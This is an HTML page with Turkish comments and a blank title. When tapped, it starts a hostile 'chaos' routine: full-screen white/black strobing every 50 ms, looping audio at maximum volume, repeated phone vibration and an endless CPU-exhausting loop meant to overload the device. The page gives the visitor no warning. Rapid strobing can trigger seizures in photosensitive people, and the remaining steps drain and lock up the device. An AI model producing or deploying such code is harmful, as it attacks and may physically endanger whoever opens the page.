<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title> </title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #000000;
            overflow: hidden;
            user-select: none;
            -webkit-user-select: none;
            cursor: pointer;
        }
        #flash {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #ffffff;
            display: none;
            z-index: 9999;
        }
    </style>
</head>
<body onclick="startChaos()">

<div id="flash"></div>

<script>
    let flashInterval;
    let isRunning = false;

    // Doğrudan kendi klasörümüzdeki yerel mp3 dosyasını çağırıyoruz
    const audio = new Audio('s10.mp3');
    audio.loop = true;
    audio.volume = 1.0; 

    function toggleFlash() {
        const flashDiv = document.getElementById('flash');
        flashInterval = setInterval(() => {
            flashDiv.style.display = flashDiv.style.display === 'none' ? 'block' : 'none';
        }, 50);
    }

    function startChaos() {
        if (isRunning) return;
        isRunning = true;

        // 1. Ekranı çıldırt
        toggleFlash();

        // 2. S23 Titreşimini başlat
        if (navigator.vibrate) {
            navigator.vibrate([1000, 50, 1000, 50, 1000, 50, 1000]);
            setInterval(() => {
                navigator.vibrate([1000, 50, 1000]);
            }, 2000);
        }

        // 3. Müziği patlat
        audio.play().then(() => {
            console.log("Müzik yerel dosyadan başarıyla başladı!");
            
            // 4. Müzik açılınca Snapdragon'ı yorma aşaması
            setTimeout(() => {
                setInterval(() => {
                    for (let i = 0; i < 4000000; i++) {
                        Math.sqrt(Math.sin(Math.random()));
                    }
                }, 100);
            }, 1000);

        }).catch(e => {
            console.log("Oynatma hatası: ", e);
        });
    }
</script>

</body>
</html>
